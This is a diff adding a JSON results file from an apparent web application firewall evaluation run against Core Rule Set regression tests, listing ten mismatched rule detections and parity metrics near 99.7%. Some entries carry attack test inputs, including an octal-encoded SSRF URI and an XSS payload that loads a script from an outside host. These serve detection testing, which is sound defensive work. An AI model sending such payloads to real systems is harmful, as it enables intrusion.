@@ -1,0 +1,136 @@
+{
+  "exceptions": 0,
+  "failure_count": 10,
+  "failure_kinds": {
+    "neg-excluded-fired": 1,
+    "pos-wrong-rule": 9
+  },
+  "failures": [
+    {
+      "description": "Status Page Test - Invalid HTTP request line: URI has scheme and authority but no path",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 934110,
+      "rule_id": "920100",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-920-PROTOCOL-ENFORCEMENT/920100.yaml",
+      "test_id": 16,
+      "uri": "http://localhost"
+    },
+    {
+      "description": "Negative test: do not match if Version is used as part of a cookie name",
+      "kind": "neg-excluded-fired",
+      "matched_rule_id": 921250,
+      "rule_id": "921250",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-921-PROTOCOL-ATTACK/921250.yaml",
+      "test_id": 3,
+      "uri": "/"
+    },
+    {
+      "description": "Positive test: utf-7 is not in allowed charsets",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 922110,
+      "rule_id": "922120",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-922-MULTIPART-ATTACK/922120.yaml",
+      "test_id": 1,
+      "uri": "/post"
+    },
+    {
+      "description": "SSRF - 8-Bit Octal conversion",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 931130,
+      "rule_id": "934120",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
+      "test_id": 27,
+      "uri": "/get?ssrf=ssh://0177.00.00.01"
+    },
+    {
+      "description": "New line bypass",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 942330,
+      "rule_id": "942522",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-942-APPLICATION-ATTACK-SQLI/942522.yaml",
+      "test_id": 7,
+      "uri": "/post"
+    },
+    {
+      "description": "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 920420,
+      "rule_id": "944150",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
+      "test_id": 23,
+      "uri": "/get"
+    },
+    {
+      "description": "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 920420,
+      "rule_id": "944151",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-944-APPLICATION-ATTACK-JAVA/944151.yaml",
+      "test_id": 23,
+      "uri": "/get"
+    },
+    {
+      "description": "Argument test includes java serialization magic bytes, base64 encoded request",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 920451,
+      "rule_id": "944200",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-944-APPLICATION-ATTACK-JAVA/944200.yaml",
+      "test_id": 1,
+      "uri": null
+    },
+    {
+      "description": "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 931130,
+      "rule_id": "949110",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
+      "test_id": 1,
+      "uri": "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//"
+    },
+    {
+      "description": "Test is basically identical to 920100-10 (protocol enforcement positive test in phase 1) but here we assert that inbound blocking mechanism is triggered",
+      "kind": "pos-wrong-rule",
+      "matched_rule_id": 920100,
+      "rule_id": "949110",
+      "source": "/srv/lumina-canonical/LuminaWAF/tests/eval_suite/coreruleset/tests/regression/tests/REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
+      "test_id": 4,
+      "uri": "/"
+    }
+  ],
+  "files": 289,
+  "metrics": {
+    "negative_exclusion": {
+      "matched": 815,
+      "percent": 99.87745098039215,
+      "total": 816
+    },
+    "positive_block": {
+      "matched": 3117,
+      "percent": 98.32807570977918,
+      "total": 3170
+    },
+    "positive_exact": {
+      "matched": 3161,
+      "percent": 99.71608832807571,
+      "total": 3170
+    },
+    "verdict_status": {
+      "matched": 0,
+      "percent": 0,
+      "total": 0
+    }
+  },
+  "oracle": "ModSecurity-compatible pinned CRS PL2 expectations",
+  "overall_parity": 99.7491219267436,
+  "schema": 1,
+  "scope": "inbound",
+  "scored_tests": 3986,
+  "skips": {
+    "configuration": 6,
+    "paranoia_level": 635,
+    "transport": 22
+  },
+  "target_pl": 2,
+  "tests": 3986,
+  "timeouts": 0
+}
